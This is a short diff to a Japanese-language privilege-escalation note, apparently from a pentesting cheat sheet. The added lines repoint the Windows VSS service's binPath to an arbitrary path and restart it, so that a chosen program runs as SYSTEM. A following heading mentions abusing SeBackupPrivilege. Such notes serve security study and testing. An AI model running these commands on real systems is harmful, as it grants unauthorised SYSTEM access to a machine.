@@ -3,8 +3,9 @@
 VSSサービスは通常、SYSTEMアカウントの権限で実行されるため権限昇格が可能。
 ```bash
 sc.exe query vss # vssの確認
-
-
+sc.exe config vss binPath="<任意のパス>" # binPathの変更
+sc.exe stop vss
+sc.exe start vss
 ```
 
 # SeBackupPrivilegeの悪用
